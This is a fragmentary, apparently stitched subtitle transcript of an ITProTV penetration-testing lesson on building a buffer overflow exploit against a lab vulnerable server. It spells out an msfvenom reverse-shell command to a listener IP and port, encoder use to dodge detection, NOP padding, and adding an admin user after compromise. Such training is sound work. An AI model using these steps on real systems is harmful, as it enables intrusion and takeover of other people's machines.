00:29:28.436\nGo ahead and fire off 3fuzz.\n\n599\n00:29:28.436 --> 00:29:31.070\nMan, I gotta take that out of there.\n\n600\n00:29:31.070 --> 00:29:32.430\nSo anyway.\n\n601\n00:29:32.430 --> 00:29:36.700\nAll right, let's look and\nI didn't quite get what I was looking for.\n\n602\n00:29:36.700 --> 00:29:39.560\nSo that means I've gotta fiddle around.\n\n603\n00:29:39.560 --> 00:29:45.060\nEven though it did say the jmp esp\nwas correct there, maybe it wasn't.\n\n604\n00:29:45.060 --> 00:29:47.580\nI need to go back and\ntry a bunch of different values.\n\n605\n00:29:47.580 --> 00:29:49.650\nNow I kind of knew this was gonna happen.\n\n606\n00:29:49.650 --> 00:29:52.420\nSo I want us to take a look\nat the final exploit code,\n\n607\n00:29:52.420 --> 00:29:55.120\nwhich has the correct value in there for\nthis to work.\n\n608\n00:29:55.120 --> 00:29:58.880\nCuz I went through all nine modules and\nfound out which ones worked and used that.\n\n609\n00:29:58.880 --> 00:30:02.540\nBut I did want you to\nsee that didn't work.\n\n610\n00:30:02.540 --> 00:30:07.130\nNot a big deal, it had eight others to\ngo through, go back and look at one.\n\n611\n00:30:07.130 --> 00:30:11.370\nAnd maybe even though the first\none said it was a return,\n\n612\n00:30:11.370 --> 00:30:13.110\nmaybe it does actually do a jmp esp.\n\n613\n00:30:13.110 --> 00:30:15.970\nSo try them all, just throw\neverything in the kitchen sink at it.\n\n614\n00:30:15.970 --> 00:30:18.770\nIf it doesn't work, try something else.\n\n615\n00:30:18.770 --> 00:30:19.940\nFiddle with it.\n\n616\n00:30:19.940 --> 00:30:22.518\nA lot of this is just a staring\ncontest between you and the computer.\n\n617\n00:30:22.518 --> 00:30:26.560\nGoing hmm, what, hmmm.\n\n618\n00:30:26.560 --> 00:30:27.630\nLet me try this.\n\n619\n00:30:27.630 --> 00:30:29.120\nTry everything you can think of.\n\n620\n00:30:29.120 --> 00:30:32.420\nSo let me fire it off one more time and\nI'll show you guys just so you can see.\n\n621\n00:30:32.420 --> 00:30:33.790\nActually I don't need to.\n\n622\n00:30:33.790 --> 00:30:35.046\nI'll just show you the split code.\n\n623\n00:30:35.046 --> 00:30:39.769\nNano sploit.py, so\nthat you can see right here,\n\n624\n00:30:39.769 --> 00:30:44.277\nthat was the good value that I found for\nthe EIP.\n\n625\n00:30:44.277 --> 00:30:46.370\nYou actually see a bunch of\nother stuff in here as well, but\n\n626\n00:30:46.370 --> 00:30:48.000\nthat's what I want you to focus on.\n\n627\n00:30:48.000 --> 00:30:50.820\nThat value was correct,\nit's in NDN format.\n\n628\n00:30:50.820 --> 00:30:54.630\nIf I run this and I stop it with Mona or\nnot with Mona, with immunity.\n\n629\n00:30:54.630 --> 00:30:56.650\nThat value will show up in the EIP.\n\n630\n00:30:56.650 --> 00:30:58.340\nWhich actually gives me the jmp esp.\n\n631\n00:30:59.970 --> 00:31:01.370\nNow we are primed and ready.\n\n632\n00:31:01.370 --> 00:31:04.840\nNow that we know, let's just\npretend I did the dirty work and\n\n633\n00:31:04.840 --> 00:31:05.920\nfound out which module it was.\n\n634\n00:31:05.920 --> 00:31:08.590\nWhich I did, but I did it for you.\n\n635\n00:31:08.590 --> 00:31:09.340\nThere we go.\n\n636\n00:31:09.340 --> 00:31:12.900\nWe are ready to create shell code and\nmove on with the final stage.\n\n637\n00:31:12.900 --> 00:31:16.850\nCreate this final exploit, so\nthat weekend exploit the system.\n\n638\n00:31:16.850 --> 00:31:18.390\n&gt;&gt; All right, Daniel, fantastic.\n\n639\n00:31:18.390 --> 00:31:19.530\nGreat demonstrations there.\n\n640\n00:31:19.530 --> 00:31:22.762\nReally get to see how we\ncan use Immunity Debugger.\n\n641\n00:31:22.762 --> 00:31:27.610\nSome Mona modules to track down and\none where that ESP and\n\n642\n00:31:27.610 --> 00:31:32.660\nthe EIP registers are within our string or\nbuffer that we were sending.\n\n643\n00:31:32.660 --> 00:31:36.980\nAnd now we're just about ready to\ncapitalize on that information.\n\n644\n00:31:36.980 --> 00:31:40.310\nSo we appreciate that, wanna make sure\neverybody stays tuned for the next one,\n\n645\n00:31:40.310 --> 00:31:42.020\ncuz now you're gonna see\nit all put together.\n\n646\n00:31:42.020 --> 00:31:46.230\nAnd we're gonna hopefully successfully\nlaunch a buffer overflow attack that\n\n647\n00:31:46.230 --> 00:31:47.880\nwe wrote from scratch.\n\n648\n00:31:47.880 --> 00:31:48.510\n&gt;&gt; Love it, love it.\n\n649\n00:31:48.510 --> 00:31:49.300\n&gt;&gt; All right.\n\n650\n00:31:49.300 --> 00:31:51.360\nHope everybody enjoyed watching this one,\ntune in for\n\n651\n00:31:51.360 --> 00:31:53.020\nthe next one to see the end result.\n\n652\n00:31:53.020 --> 00:31:55.850\nSigning out for ITProTV,\nI've been your host Mike Rodrick.\n\n653\n00:31:55.850 --> 00:31:56.650\n&gt;&gt; And I'm Daniel

You're watching ITProTV.\n\n4\n00:00:12.174 --> 00:00:15.521\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV,\n\n5\n00:00:15.521 --> 00:00:19.600\nI'm your host Mike Rodrick and\ntoday we're doing penetration testing.\n\n6\n00:00:19.600 --> 00:00:20.833\nAnd in this episode,\n\n7\n00:00:20.833 --> 00:00:25.088\nwe're gonna be finishing up our little\nminiseries on buffer overflows.\n\n8\n00:00:25.088 --> 00:00:28.602\nThis is part four, so if you missed any\nof the others, parts one, two or three,\n\n9\n00:00:28.602 --> 00:00:30.550\nmake sure you go back and\nwatch those first.\n\n10\n00:00:30.550 --> 00:00:33.210\nIt'll make part four\nmake a lot more sense.\n\n11\n00:00:33.210 --> 00:00:37.670\nBut at this point, we've gone through\nquite a few steps to get where we are.\n\n12\n00:00:37.670 --> 00:00:43.150\nWe're just about ready to really build and\nlaunch our buffer overflow attack.\n\n13\n00:00:43.150 --> 00:00:47.460\nSo I\"m gonna hand it right over to\nthe master himself, Mr. Daniel Lowrie.\n\n14\n00:00:47.460 --> 00:00:48.290\nWelcome back, Daniel.\n\n15\n00:00:48.290 --> 00:00:48.850\n&gt;&gt; All right, Mike.\n\n16\n00:00:48.850 --> 00:00:49.820\nThanks for having me back, man.\n\n17\n00:00:49.820 --> 00:00:54.370\nI appreciate joining us back in the studio\ntoday to finish up buffer overflows.\n\n18\n00:00:54.370 --> 00:00:57.140\nYou've got to be thinking, man,\nthis is a lot of information and\n\n19\n00:00:57.140 --> 00:00:57.900\nyou would be correct.\n\n20\n00:00:57.900 --> 00:00:58.980\nIt is a lot of information.\n\n21\n00:00:58.980 --> 00:01:01.010\nIt's a lot of complex information.\n\n22\n00:01:01.010 --> 00:01:05.250\nWhich is why it's taking up\nfour parts to do, but and\n\n23\n00:01:05.250 --> 00:01:07.010\nthat's why everybody\ndoesn't do it as well.\n\n24\n00:01:07.010 --> 00:01:10.280\nSo that's our gift to\nyou as our viewers is so\n\n25\n00:01:10.280 --> 00:01:12.200\nthat you might be able to\nunderstand these things.\n\n26\n00:01:12.200 --> 00:01:15.680\nReally try to break it down,\nmake it a little easier to digest for\n\n27\n00:01:15.680 --> 00:01:18.120\neverybody out there watching\nwho wants to learn this stuff.\n\n28\n00:01:18.120 --> 00:01:22.550\nSo we're in our last phase of\ncreating our buffer overflow.\n\n29\n00:01:22.550 --> 00:01:27.140\nIn the previous episode,\nwe found the exact EIP area,\n\n30\n00:01:27.140 --> 00:01:31.080\nwe made sure that that existed,\nwe jumped into using MONA.\n\n31\n00:01:31.080 --> 00:01:36.125\nDefine a module that would give us\nthe jump ESP value that we need and\n\n32\n00:01:36.125 --> 00:01:42.265\nthen we found an actual spot to\ndo that inside of that module.\n\n33\n00:01:42.265 --> 00:01:47.295\nNow we are at the final phase\nwhich is creating the shell code\n\n34\n00:01:47.295 --> 00:01:52.180\nthat is going to, actually it's\ngonna go into our ESP register.\n\n35\n00:01:52.180 --> 00:01:55.590\nSo when that jump ESP gets executed,\n\n36\n00:01:55.590 --> 00:01:58.890\nit has some executable\ncode in which to execute.\n\n37\n00:01:58.890 --> 00:02:01.390\nOtherwise, it's just a bunch of Cs and\nwhat good is that?\n\n38\n00:02:01.390 --> 00:02:02.450\nThat's not good at all, right?\n\n39\n00:02:02.450 --> 00:02:05.690\n&gt;&gt; So this is gonna be our malicious\ncode that we wanna get executed.\n\n40\n00:02:05.690 --> 00:02:06.680\n&gt;&gt; That's exactly right.\n\n41\n00:02:06.680 --> 00:02:09.890\nHere's where we put in the nefariousness.\n\n42\n00:02:09.890 --> 00:02:11.250\nThat's what we're gonna do.\n\n43\n00:02:11.250 --> 00:02:12.990\nSo we need to create shell code.\n\n44\n00:02:12.990 --> 00:02:16.477\nAnd I know, Mike, you can just bang\nthat out for us and program that.\n\n45\n00:02:16.477 --> 00:02:17.111\nWe'd appreciate it.\n&gt;&gt; Absolutely,\n\n46\n00:02:17.111 --> 00:02:18.621\nif you can pull that screen\nup here I'll start to-\n\n47\n00:02:18.621 --> 00:02:19.710\n&gt;&gt; Yeah, that's perfect.\n\n48\n00:02:19.710 --> 00:02:22.530\nNo, we can't do that because\nit's very difficult.\n\n49\n00:02:22.530 --> 00:02:25.510\nAnd you'd have to be a very\ngood programmer to do that.\n\n50\n00:02:26.550 --> 00:02:28.620\nNow I'm not telling you that you're\nnot gonna be able to do this.\n\n51\n00:02:28.620 --> 00:02:30.980\nWhat I'm saying is that unless\nyou're an awesome programmer,\n\n52\n00:02:30.980 --> 00:02:34.900\nyou're gonna do like I do and\nrely on somebody to help me.\n\n53\n00:02:34.900 --> 00:02:36.868\nAnd that is our friend at Metasploit.\n\n54\n00:02:36.868 --> 00:02:40.790\nThey have created a wonderful product,\nwe love that products.\n\n55\n00:02:40.790 --> 00:02:43.940\nIt works really well, it's actually\nkind of scary how well it does work.\n\n56\n00:02:43.940 --> 00:02:47.710\nIt has a little feature\ninside of it called msfvenom.\n\n57\n00:02:47.710 --> 00:02:52.340\nAnd msfvenom is actually if you\nhearken back to older Metasploit,\n\n58\n00:02:52.340 --> 00:02:54.085\nthere were two modules.\n\n59\n00:02:54.085 --> 00:02:54.960\nI can't ever remember them.\n\n60\n00:02:54.960 --> 00:02:59.110\nIt was msfencode and\nthere was another one I forget.\n\n61\n00:02:59.110 --> 00:03:02.340\nIt was basically those two put\ntogether and now it's just msfvenom.\n\n62\n00:03:02.340 --> 00:03:05.870\nThose two have been depreciated and\nnow it's msfvenom.\n\n63\n00:03:05.870 --> 00:03:10.240\nWe're gonna use msfvenom to create our\nshell code for us, all we have to do is\n\n64\n00:03:10.240 --> 00:03:15.030\ngive it some parameters, so that it can\ngive us the shell code that we need.\n\n65\n00:03:15.030 --> 00:03:16.690\nOnce the shell code is generated,\nwe copy and\n\n66\n00:03:16.690 --> 00:03:19.404\npaste that into our code creating\na variable parameter for that.\n\n67\n00:03:19.404 --> 00:03:22.460\nAdding it to our string\nof data that's going out\n\n68\n00:03:22.460 --> 00:03:24.690\nthe door into our vulnerable server.\n\n69\n00:03:24.690 --> 00:03:28.380\nAnd voila,\nwe should have exploitable code.\n\n70\n00:03:28.380 --> 00:03:31.410\n&gt;&gt; And I think it was msfpayload,\njust for you guys like the trivia.\n\n71\n00:03:31.410 --> 00:03:33.530\n&gt;&gt; Thank you, yes, that's exactly it.\n\n72\n00:03:33.530 --> 00:03:34.450\nWhy didn't I think of that?\n\n73\n00:03:34.450 --> 00:03:35.780\nThat's what it was.\n\n74\n00:03:35.780 --> 00:03:37.870\nSo, how do we do that, where do we start?\n\n75\n00:03:37.870 --> 00:03:43.080\nWell, we need to do msfvenom, let's jump\ninto my machine and see how we do that.\n\n76\n00:03:43.080 --> 00:03:46.945\nYou just type in msfvenom, like that.\n\n77\n00:03:46.945 --> 00:03:49.400\nThat's our, the beginning of our code.\n\n78\n00:03:49.400 --> 00:03:54.010\nWhat we're gonna do is we're gonna,\nit's gonna be quite a long string\n\n79\n00:03:54.010 --> 00:03:58.000\nof characters, a lot of information\nwe have feed into msfvenom, so\n\n80\n00:03:58.000 --> 00:04:01.032\nthat it creates the proper\nshell code that we need.\n\n81\n00:04:01.032 --> 00:04:04.060\nAll right, first thing we need to do\nis tell what platform we're using.\n\n82\n00:04:04.060 --> 00:04:06.260\nThis is a Windows platform.\n\n83\n00:04:06.260 --> 00:04:11.154\nTo create the shell code or create the\nlistener or the reverse shell or whatever.\n\n84\n00:04:11.154 --> 00:04:13.857\nFirst we're trying to create\na bind shell or reverse Shell,\n\n85\n00:04:13.857 --> 00:04:17.480\non what platform is that going to reside,\nright, or be worked with.\n\n86\n00:04:17.480 --> 00:04:18.828\nIn this case, it's Windows.\n\n87\n00:04:18.828 --> 00:04:25.920\nSo we do -p and we say windows/,\nnow I'm gonna create a reverse shell.\n\n88\n00:04:25.920 --> 00:04:28.850\nI like them to send me shells\ninstead of jumping and\n\n89\n00:04:28.850 --> 00:04:31.350\ntrying to connect to\na shell that they open.\n\n90\n00:04:31.350 --> 00:04:32.220\nIt's just my preference.\n\n91\n00:04:32.220 --> 00:04:35.400\nYou can use a bind shell but\nI'm gonna go reverse shell on this.\n\n92\n00:04:35.400 --> 00:04:41.401\nSo I'll say shell, shell not shoul,\n\n93\n00:04:41.401 --> 00:04:46.850\nshell_reverse_tcp, like so.\n\n94\n00:04:46.850 --> 00:04:49.380\nThen I need to give it a listening host.\n\n95\n00:04:49.380 --> 00:04:54.427\nMy listener will be my box lhost =\n\n96\n00:04:54.427 --> 00:05:00.209\n192.168.219.146.\n\n97\n00:05:00.209 --> 00:05:04.298\nAnd then the port that it's\nlistening on l port equals,\n\n98\n00:05:04.298 --> 00:05:10.301\nI'm going 5555 here cuz I don't wanna\ninterfere with our vuln server stuff.\n\n99\n00:05:11.310 --> 00:05:13.070\nJust in case that would happen.\n\n100\n00:05:13.070 --> 00:05:15.500\nAll right, so now we got the port set in.\n\n101\n00:05:15.500 --> 00:05:16.860\nThe next thing we need to do,\n\n102\n00:05:16.860 --> 00:05:21.580\nI like to do this just so\nthat it helps keep it from crashing after.\n\n103\n00:05:21.580 --> 00:05:24.400\nBut sometimes it works, sometimes it\ndoesn't but just do like a exit function.\n\n104\n00:05:25.585 --> 00:05:31.210\nXIT, I'm gonna spread my,\nthis stuff gets chopped off.\n\n105\n00:05:31.210 --> 00:05:33.480\nI don't want you guys to be\nlooking at choppy code here.\n\n106\n00:05:33.480 --> 00:05:36.190\nEXITFUNC like that equals thread.\n\n107\n00:05:36.190 --> 00:05:37.320\nSo that creates a thread.\n\n108\n00:05:38.530 --> 00:05:41.460\nNow I'll try to shrink it back in so\nI know exactly.\n\n109\n00:05:41.460 --> 00:05:45.930\nThere we go, that makes it look a little\nnicer for you guys out there watching.\n\n110\n00:05:45.930 --> 00:05:47.850\nThat is not a necessity.\n\n111\n00:05:47.850 --> 00:05:53.840\nThat is me being nice to my end user\nbecause Aa lot of times it'll just crash,\n\n112\n00:05:53.840 --> 00:05:55.860\ninstead of, okay.\n\n113\n00:05:55.860 --> 00:05:58.750\nI'm done doing that, now I'll drop that\ncuz it starts as a thread instead of\n\n114\n00:05:58.750 --> 00:06:02.540\ntaking over the entire server service.\n\n115\n00:06:02.540 --> 00:06:03.542\nAnd then crashing it.\n\n116\n00:06:03.542 --> 00:06:06.399\n&gt;&gt; And if your pen testing or\nif you're launching an attack,\n\n117\n00:06:06.399 --> 00:06:08.964\nI mean you wanna take advantage\nof the fact that hey,\n\n118\n00:06:08.964 --> 00:06:13.410\nI can launch buffer overflow and\ntake over this machine if it crashes.\n\n119\n00:06:13.410 --> 00:06:15.950\nCan't really take it over and you don't\nknow where they're gonna find it,\n\n120\n00:06:15.950 --> 00:06:18.910\nrestart it, so you do wanna be\na little careful with that.\n\n121\n00:06:18.910 --> 00:06:22.390\n&gt;&gt; Yeah, you wanna try to be as careful as\npossible, because if you're continually\n\n122\n00:06:22.390 --> 00:06:26.205\ncrashing their system to get into it,\nthat's gonna kind of raise an eyebrow.\n\n123\n00:06:26.205 --> 00:06:31.279\nSo you might wanna throw this on top of\nthe hip just to make it a little nicer and\n\n124\n00:06:31.279 --> 00:06:34.465\nin that sense they won't\nget their eye raised.\n\n125\n00:06:34.465 --> 00:06:38.148\nAll right, so we got,\nnow I didn't do a -f c,\n\n126\n00:06:38.148 --> 00:06:43.170\nbecause this is C code,\nI basically wanted to format this in C.\n\n127\n00:06:44.200 --> 00:06:48.980\nThat will be my shell code and then -a\nwill be the architecture, which is x86.\n\n128\n00:06:48.980 --> 00:06:54.405\nThis is a 32 bit program, so\nI need to throw that at that.\n\n129\n00:06:54.405 --> 00:06:57.270\nThen --platform, yes,\nit sounds a little redundant,\n\n130\n00:06:57.270 --> 00:06:59.390\nbecause we already did a platform.\n\n131\n00:06:59.390 --> 00:07:02.640\nBut we're doing platform for\nsomething else for the encoding part.\n\n132\n00:07:02.640 --> 00:07:04.680\nSo I'm letting you know\nwhat platform that is.\n\n133\n00:07:04.680 --> 00:07:10.000\nThat's just platform which is windows -b,\nremember that bad characters.\n\n134\n00:07:10.000 --> 00:07:12.890\nIf we were to a found bad characters or\n\n135\n00:07:12.890 --> 00:07:19.140\nwe want a window of [INAUDIBLE]\njust like the mail bytes, right?\n\n136\n00:07:19.140 --> 00:07:21.910\nThe carriage return,\nthings that typically cause problems.\n\n137\n00:07:21.910 --> 00:07:24.030\nWe go ahead and\nthrow that on the fire and let it know,\n\n138\n00:07:24.030 --> 00:07:25.970\nyou know what just leave those out.\n\n139\n00:07:25.970 --> 00:07:27.210\nI don't care if it can handle them or not,\n\n140\n00:07:27.210 --> 00:07:29.970\nI don't wanna go through the process\nof trying to figure out whether or\n\n141\n00:07:29.970 --> 00:07:33.210\nnot it can, so I know those can\ntypically be bad characters.\n\n142\n00:07:33.210 --> 00:07:34.110\nLet's just leave those out.\n\n143\n00:07:34.110 --> 00:07:36.820\nThen you just have to define what\nthose bad characters are and\n\n144\n00:07:36.820 --> 00:07:41.080\nyou do that by exclamation point and\ngiving it their hex value.\n\n145\n00:07:41.080 --> 00:07:46.907\nSo you gotta do the /x00/x0a and\n/x0d like so\n\n146\n00:07:46.907 --> 00:07:52.370\nand finish it off with the double quotes.\n\n147\n00:07:52.370 --> 00:07:56.874\nThen we got one more thing to do which\nis what encoder are we going to use.\n\n148\n00:07:56.874 --> 00:08:00.120\nThis is a fun thing to say and\nit's even funnier thing to type.\n\n149\n00:08:00.120 --> 00:08:01.605\nA more fun thing to type.\n\n150\n00:08:01.605 --> 00:08:05.413\n&gt;&gt; [LAUGH]\n&gt;&gt; So say -e for our encoder Which will be\n\n151\n00:08:05.413 --> 00:08:11.455\nX8060 our architecture is 32 bit,\nand it is shikata_ga_nai.\n\n152\n00:08:11.455 --> 00:08:12.862\nYeah, it's a mouthful.\n\n153\n00:08:12.862 --> 00:08:14.418\nIt's Japanese obviously.\n\n154\n00:08:14.418 --> 00:08:17.271\nWell maybe not obviously,\nbut it's Japanese.\n\n155\n00:08:17.271 --> 00:08:21.006\nAnd it means nothing else or\nsomething to that effect.\n\n156\n00:08:21.006 --> 00:08:22.444\nIt's a strange term.\n\n157\n00:08:22.444 --> 00:08:27.402\nBut Metasploit is the only encoder\nthey give the excellent rating to for\n\n158\n00:08:27.402 --> 00:08:32.780\nencoders because of basically,\nit's a very polymorphic algorithm.\n\n159\n00:08:32.780 --> 00:08:37.691\nKinda just makes sure that it gets\nsome decoding, so that it doesn't go,\n\n160\n00:08:37.691 --> 00:08:41.252\ntthis is bad code and\ndrop it because it's shell code.\n\n161\n00:08:41.252 --> 00:08:44.380\nSo that it decodes well inside of your.\n\n162\n00:08:44.380 --> 00:08:49.280\nSo any kind of extra stank that they\nput on it to look for bad code,\n\n163\n00:08:49.280 --> 00:08:51.970\nand to rid themselves of it, or kill it\n&gt;&gt; It's like that wrapper that makes it\n\n164\n00:08:51.970 --> 00:08:54.480\nlook like a pretty present that\nthe computer wants, right?\n\n165\n00:08:54.480 --> 00:08:55.398\n&gt;&gt; I like that, I like that.\n\n166\n00:08:55.398 --> 00:08:56.170\nTIt's exactly right.\n\n167\n00:08:56.170 --> 00:08:57.870\nIt's saying hey, I'm good.\n\n168\n00:08:57.870 --> 00:08:58.814\nMe and you, we're buds.\n\n169\n00:08:58.814 --> 00:09:00.313\n&gt;&gt;

The end goal there is just to make sure\nthat taking all of that into account,\n\n229\n00:11:57.150 --> 00:12:01.070\nthe attack, which you've got to separate,\nthe EIP, the NOPs, the payload or\n\n230\n00:12:01.070 --> 00:12:02.040\nthe shell.\n\n231\n00:12:02.040 --> 00:12:03.680\nAll of that has to total up to 3,000.\n\n232\n00:12:03.680 --> 00:12:07.380\nSo we can change that pad a little\nbit to make sure that in the end,\n\n233\n00:12:07.380 --> 00:12:08.500\nwe have 3,000 bytes for sending.\n\n234\n00:12:08.500 --> 00:12:09.230\n&gt;&gt; That's exactly right.\n\n235\n00:12:09.230 --> 00:12:12.520\nWe wanna stick with we've already\ndone to make sure it stays the same.\n\n236\n00:12:12.520 --> 00:12:14.310\nWe don't wanna adjust values.\n\n237\n00:12:14.310 --> 00:12:16.728\nSo we gotta make sure everything\nworks itself out to 3,000.\n\n238\n00:12:16.728 --> 00:12:20.796\nSo when you copy and paste the shell code,\n\n239\n00:12:20.796 --> 00:12:25.340\nyou notice that I have\nthis open parentheses.\n\n240\n00:12:25.340 --> 00:12:30.970\nAnd then, each one of these have\na double quote on each end.\n\n241\n00:12:30.970 --> 00:12:33.980\nThat way I can make this\nin block formats and\n\n242\n00:12:33.980 --> 00:12:36.630\nnot have it string off like we\ndid with our unique character.\n\n243\n00:12:36.630 --> 00:12:38.170\nI didn't care so much there, but\n\n244\n00:12:38.170 --> 00:12:41.180\nhere I want you to see what it\nkinda looks like in the end result.\n\n245\n00:12:41.180 --> 00:12:44.080\nYou can make it string off into\nthe end of creation if you want and\n\n246\n00:12:44.080 --> 00:12:46.190\njust do it normally like we have up here.\n\n247\n00:12:46.190 --> 00:12:49.820\nBut if you want a block code,\nget your open parenthesis and\n\n248\n00:12:49.820 --> 00:12:52.190\nthen just add the double quotes\nat the end of each strand.\n\n249\n00:12:52.190 --> 00:12:54.290\nJust chop it wherever you like.\n\n250\n00:12:54.290 --> 00:12:56.390\nChop it, add your double quotes,\nchop it, add your double quotes,\n\n251\n00:12:56.390 --> 00:12:57.750\nchop it, add your double quotes.\n\n252\n00:12:57.750 --> 00:13:01.695\nAnd at the end,\nthere was also a semi-colon here.\n\n253\n00:13:01.695 --> 00:13:02.720\nRemove that.\n\n254\n00:13:02.720 --> 00:13:05.260\nAnd make sure your closed\nparenthesis is there.\n\n255\n00:13:05.260 --> 00:13:09.310\nThat's the only caveats I wanna give you,\nas far as Python goes,\n\n256\n00:13:09.310 --> 00:13:12.630\nto make sure this variable\nis structured correctly.\n\n257\n00:13:12.630 --> 00:13:16.790\nThat being said, you'll notice\nthat we go down here to my send,\n\n258\n00:13:16.790 --> 00:13:18.530\nwhat I'm sending, send the attack.\n\n259\n00:13:18.530 --> 00:13:20.563\nThat's all the A's, the EIP,\n\n260\n00:13:20.563 --> 00:13:24.490\nthat's the four bytes of the EIP\nwhere that jump ESP resides.\n\n261\n00:13:25.830 --> 00:13:26.740\nNow let's talk about NOPs.\n\n262\n00:13:26.740 --> 00:13:28.508\nWhat is NOPs?\n\n263\n00:13:28.508 --> 00:13:35.200\nNOPs are no operators, or null operators,\nand the value for NOP is x90.\n\n264\n00:13:35.200 --> 00:13:38.738\nThat's what you wanna know right there.\n\n265\n00:13:38.738 --> 00:13:41.280\nThat's our boy, where you going?\n\n266\n00:13:41.280 --> 00:13:43.714\nOver there, x90,\nthat's what you wanna know.\n\n267\n00:13:43.714 --> 00:13:46.511\nNOPs are basically an instruction\nto the computer to say,\n\n268\n00:13:46.511 --> 00:13:47.890\ngo to the next instruction.\n\n269\n00:13:47.890 --> 00:13:48.980\nGo to the next instruction.\n\n270\n00:13:51.740 --> 00:13:56.520\nI like to pad with NOPs because what can\nhappen is, If you don't have some NOPs at\n\n271\n00:13:56.520 --> 00:14:00.540\nthe beginning of your code, a lot of\ntimes, it will just not work, right.\n\n272\n00:14:00.540 --> 00:14:04.460\nIt's just a, I don't know why it\ndoes that to be honest with you.\n\n273\n00:14:04.460 --> 00:14:07.150\nI just know that putting NOPs at\nthe beginning of that stops that from\n\n274\n00:14:07.150 --> 00:14:07.674\nhappening.\n\n275\n00:14:07.674 --> 00:14:11.993\nIf you don't put the NOPs, if I just threw\nthis with the shell code, it might work,\n\n276\n00:14:11.993 --> 00:14:13.748\nit might not, and probably not.\n\n277\n00:14:13.748 --> 00:14:17.520\nYou throw some NOPs at the beginning of\nthat, It kind of gives it that buffer.\n\n278\n00:14:17.520 --> 00:14:21.651\nIt's a little bit of a buffer between,\nokay, we've jumped to the ESP,\n\n279\n00:14:21.651 --> 00:14:25.600\nand now you're giving me the shell code,\nand it's freaking me out.\n\n280\n00:14:25.600 --> 00:14:27.802\nSo we put a little NOPs on there, and\nit just says hey, my instruction,\n\n281\n00:14:27.802 --> 00:14:28.706\ngo to the next instruction.\n\n282\n00:14:28.706 --> 00:14:31.343\nGo to the next instruction.\n\n283\n00:14:31.343 --> 00:14:33.350\nApparently it calms down to\nthe computer [LAUGH] the system.\n\n284\n00:14:33.350 --> 00:14:35.300\n&gt;&gt;

I'm telling you, I think trumpets\nare playing somewhere, I like it.\n\n327\n00:16:34.037 --> 00:16:37.730\n&gt;&gt; You do the who am I.\n\n328\n00:16:37.730 --> 00:16:41.438\nAnd it says,\nyou are logged in as administrator, and\n\n329\n00:16:41.438 --> 00:16:43.640\nI now have prompt to that server.\n\n330\n00:16:43.640 --> 00:16:47.576\nI have exploited the fact that\nI was able to buffer overflow,\n\n331\n00:16:47.576 --> 00:16:50.364\nit fired off my exploit code, and I'm in.\n\n332\n00:16:50.364 --> 00:16:56.781\nI am an administrator,\nI can start doing what,\n\n333\n00:16:56.781 --> 00:17:02.750\nlike met localuser, hacker hacker /add.\n\n334\n00:17:02.750 --> 00:17:07.644\nActually, I already have that user, so.\n\n335\n00:17:07.644 --> 00:17:13.324\nYou'll notice it doesn't like [LAUGH]\nweird characters like backspaces and\n\n336\n00:17:13.324 --> 00:17:14.750\nthings like that.\n\n337\n00:17:14.750 --> 00:17:19.678\nOne of the caveats of working with\nexploited shells that you tunnel\n\n338\n00:17:19.678 --> 00:17:20.734\nto yourself.\n\n339\n00:17:20.734 --> 00:17:24.172\nReally kinda hinky,\nyou wanna get better code.\n\n340\n00:17:24.172 --> 00:17:26.203\nYou wanna be able to like SSH in.\n\n341\n00:17:26.203 --> 00:17:27.876\nSo you're gonna go from here, and\n\n342\n00:17:27.876 --> 00:17:31.400\nmaybe create yourself a user account\nlike what I was trying to do.\n\n343\n00:17:31.400 --> 00:17:36.352\nSo I can say, what was it,\nnet user, no I'm sorry,\n\n344\n00:17:36.352 --> 00:17:39.177\nlocal user, local, right?\n\n345\n00:17:39.177 --> 00:17:40.098\nIs it local user, Mike?\n\n346\n00:17:40.098 --> 00:17:41.223\nYou're the Windows guy.\n\n347\n00:17:41.223 --> 00:17:43.505\n&gt;&gt; Gosh, it's been so long since\nI've done one from the command line.\n\n348\n00:17:43.505 --> 00:17:49.567\n&gt;&gt; I'll call mike mike /add.\n\n349\n00:17:49.567 --> 00:17:50.945\nThere we go, it fired off.\n\n350\n00:17:50.945 --> 00:17:51.904\nLet's go over to that machine.\n\n351\n00:17:54.593 --> 00:18:00.947\nAnd Computer &gt; Manage Local Users and\nGroups.\n\n352\n00:18:00.947 --> 00:18:04.062\nAnd, I guess I didn't say it right.\n\n353\n00:18:04.062 --> 00:18:08.083\nBut if,\nI can never remember what it is for that.\n\n354\n00:18:08.083 --> 00:18:10.919\nBut that's it, I can give it commands.\n\n355\n00:18:10.919 --> 00:18:12.578\nI can say dir, I can look at that.\n\n356\n00:18:12.578 --> 00:18:15.734\nI can create files,\nI can edit files, I can, obviously,\n\n357\n00:18:15.734 --> 00:18:19.740\nif I remember the correct syntax for\ncreating a local user account.\n\n358\n00:18:19.740 --> 00:18:22.651\n&gt;&gt; Try net user and then just use name and\nslash add no password.\n\n359\n00:18:22.651 --> 00:18:23.696\n&gt;&gt; Okay, let's try that.\n\n360\n00:18:23.696 --> 00:18:25.333\nSo-\n&gt;&gt; And then you get to go back and\n\n361\n00:18:25.333 --> 00:18:25.975\nset the password after.\n\n362\n00:18:25.975 --> 00:18:31.766\n&gt;&gt; Net user mike, okay,\nand we'll say /add.\n\n363\n00:18:31.766 --> 00:18:34.723\nThere you go,\nthe command is completed successfully.\n\n364\n00:18:34.723 --> 00:18:36.461\nWe go over here and refresh that.\n\n365\n00:18:39.952 --> 00:18:42.064\nWhere is it, refresh.\n\n366\n00:18:42.064 --> 00:18:42.939\nI'm a horrible mouse user.\n\n367\n00:18:42.939 --> 00:18:45.021\n&gt;&gt; [LAUGH]\n&gt;&gt; And there he is Mike,\n\n368\n00:18:45.021 --> 00:18:47.444\nI can set the password for\nhim, I can do whatever I want.\n\n369\n00:18:47.444 --> 00:18:50.676\nI have administrative control and\nthat's the danger of buffer overflows.\n\n370\n00:18:50.676 --> 00:18:51.546\n&gt;&gt; Right.\n\n371\n00:18:51.546 --> 00:18:54.408\n&gt;&gt; All right, so that's it, that's buffer\noverflows, I'm trying to think is there\n\n372\n00:18:54.408 --> 00:18:57.641\nanything left, other than\n&gt;&gt; Take a deep breath.\n\n373\n00:18:57.641 --> 00:18:59.432\n&gt;&gt; Yeah, take a deep breath,\nthis was a long process.\n\n374\n00:18:59.432 --> 00:19:02.821\nIt was a lot of work, and\nthat's the process you have to go through.\n\n375\n00:19:02.821 --> 00:19:04.522\nAnd it's difficult and it's painstaking.\n\n376\n00:19:04.522 --> 00:19:07.239\nBut man, when you get that shell,\n\n377\n00:19:07.239 